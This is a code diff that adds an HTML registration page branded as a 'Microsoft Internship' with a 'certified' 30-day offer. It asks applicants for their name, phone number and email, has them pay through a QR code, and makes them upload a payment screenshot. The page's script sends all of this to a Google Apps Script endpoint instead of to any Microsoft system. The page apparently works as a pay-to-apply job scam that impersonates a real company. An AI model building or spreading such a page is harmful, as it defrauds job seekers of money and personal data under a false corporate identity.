@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Microsoft Internship Form</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Poppins', sans-serif;
+      background-color: #f3f4f6;
+      padding: 20px;
+      margin: 0;
+    }
+    .form-wrapper {
+      padding-left: 0px;
+      padding-right: 26px;
+    }
+    .container {
+      max-width: 90%;
+      width: 95%;
+      background: white;
+      margin: auto;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    h2 {
+      color: #0078d4;
+      text-align: center;
+      font-size: 24px;
+      margin-bottom: 8px;
+    }
+    .note {
+      font-size: 11px;
+      color: #555;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    label {
+      font-weight: 600;
+      display: block;
+      margin: 12px 0 5px;
+      font-size: 14px;
+    }
+    input, select {
+      width: 100%;
+      padding: 8px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+    .payment-box {
+      background-color: #edf4fc;
+      border-left: 5px solid #0078d4;
+      padding: 12px;
+      margin-top: 18px;
+      margin-bottom: 10px;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+    .payment-box p {
+      margin: 0 0 8px;
+    }
+    .qr-img {
+      display: block;
+      margin: 10px auto;
+      max-width: 120px;
+      border: 2px solid #ccc;
+      border-radius: 8px;
+    }
+    button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 10px;
+      background-color: #0078d4;
+      color: white;
+      font-size: 15px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #005a9e;
+    }
+
+    /* Fullscreen overlay */
+    .overlay, .popup {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      display: none;
+      justify-content: center;
+      align-items: center;
+      background: rgba(255, 255, 255, 0.9);
+      z-index: 9999;
+    }
+    .popup-box {
+      background: #fff;
+      padding: 25px 15px;
+      border-radius: 12px;
+      text-align: center;
+      box-shadow: 0 0 25px rgba(0, 0, 0, 0.2);
+      max-width: 250px;
+      width: 75%;
+    }
+    .popup-box h3 {
+      color: #0078d4;
+      margin-bottom: 10px;
+      font-size: 18px;
+    }
+    .popup-box p {
+      font-size: 12px;
+      color: #333;
+    }
+    .popup-box button {
+      margin-top: 20px;
+      background-color: #0078d4;
+      color: white;
+      font-size: 12px;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .popup-box button:hover {
+      background-color: #005a9e;
+    }
+    .loading-text {
+      font-size: 18px;
+      color: #0078d4;
+      text-align: center;
+    }
+    .loader {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #0078d4;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 15px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="form-wrapper">
+    <div class="container">
+      <h2>Microsoft Internship Registration</h2>
+      <div class="note">Once registered, you will receive an email with all details and your offer letter. This is a 30-day certified internship.</div>
+      <form id="internshipForm">
+        <label for="name">Full Name</label>
+        <input type="text" name="name" required />
+
+        <label for="contact">Contact Number</label>
+        <input type="text" name="contact" required />
+
+        <label for="email">Email Address</label>
+        <input type="email" name="email" required />
+
+        <label for="startDate">Select Start Date</label>
+        <select name="startDate" required>
+          <option value="">-- Select Date --</option>
+          <option value="05/May/2025">05/May/2025</option>
+          <option value="16/May/2025">16/May/2025</option>
+        </select>
+
+        <label for="timing">Preferred Timings</label>
+        <select name="timing" required>
+          <option value="">-- Select Timing --</option>
+          <option value="10AM - 1PM">10AM - 1PM</option>
+          <option value="2PM - 5PM">2PM - 5PM</option>
+          <option value="6PM - 9PM">6PM - 9PM</option>
+        </select>
+
+        <label for="course">Select Course</label>
+        <select name="course" required>
+          <option value="">-- Select Course --</option>
+          <option value="Data Science with Python">Data Science with Python</option>
+          <option value="Web Development">Web Development</option>
+          <option value="Machine Learning">Machine Learning</option>
+          <option value="Artificial Intelligence">Artificial Intelligence</option>
+          <option value="Cloud Computing">Cloud Computing</option>
+          <option value="Cyber Security">Cyber Security</option>
+          <option value="Blockchain Basics">Blockchain Basics</option>
+          <option value="DevOps Fundamentals">DevOps Fundamentals</option>
+          <option value="UI/UX Design">UI/UX Design</option>
+          <option value="Mobile App Development">Mobile App Development</option>
+          <option value="Internet of Things (IoT)">Internet of Things (IoT)</option>
+          <option value="Full Stack Development">Full Stack Development</option>
+          <option value="Digital Marketing">Digital Marketing</option>
+          <option value="Power BI & Data Visualization">Power BI & Data Visualization</option>
+          <option value="Python Programming">Python Programming</option>
+        </select>
+
+        <div class="payment-box">
+          <p><strong>📌 Make payment to the QR below before uploading your screenshot:</strong></p>
+          <img class="qr-img" src="1.jpg" alt="QR Code for Payment" />
+        </div>
+
+        <label for="screenshot">Upload Payment Screenshot</label>
+        <input type="file" name="screenshot" accept="image/*" required />
+
+        <button type="submit">Submit Registration</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Loading Screen -->
+  <div class="overlay" id="loadingOverlay">
+    <div>
+      <div class="loader"></div>
+      <div class="loading-text">Processing your registration...</div>
+    </div>
+  </div>
+
+  <!-- Success Popup -->
+  <div class="popup" id="popup">
+    <div class="popup-box">
+      <h3>Successfully Registered!</h3>
+      <p>Please check your email for the offer letter and further details.</p>
+      <button onclick="window.location.reload()">OK</button>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById("internshipForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const form = document.getElementById("internshipForm");
+      const formData = new FormData(form);
+      const payload = new URLSearchParams();
+      let hasFile = false;
+
+      formData.forEach((value, key) => {
+        if (key === "screenshot" && value instanceof File) {
+          hasFile = true;
+          const reader = new FileReader();
+          reader.onloadend = function () {
+            const base64data = reader.result.split(',')[1];
+            payload.append("screenshot", base64data);
+            sendData();
+          };
+          reader.readAsDataURL(value);
+        } else {
+          payload.append(key, value);
+        }
+      });
+
+      function sendData() {
+        document.getElementById("loadingOverlay").style.display = "flex";
+
+        fetch("https://script.google.com/macros/s/AKfycbx3Wo9Ny6sZt9HARgx-JZWmr0jPifauxU9BXEr7bvj4NGdmc6nwPHN53BjWqFBcQsa5/exec", {
+          method: "POST",
+          body: payload,
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+          }
+        })
+        .then(res => res.text())
+        .then(res => {
+          document.getElementById("loadingOverlay").style.display = "none";
+          if (res === "Success") {
+            document.getElementById("popup").style.display = "flex";
+            form.reset();
+          } else {
+            alert("❌ Error: " + res);
+          }
+        })
+        .catch(err => {
+          document.getElementById("loadingOverlay").style.display = "none";
+          alert("❌ Failed to submit: " + err);
+        });
+      }
+
+      if (!hasFile) {
+        sendData();
+      }
+    });
+  </script>
+</body>
+</html>
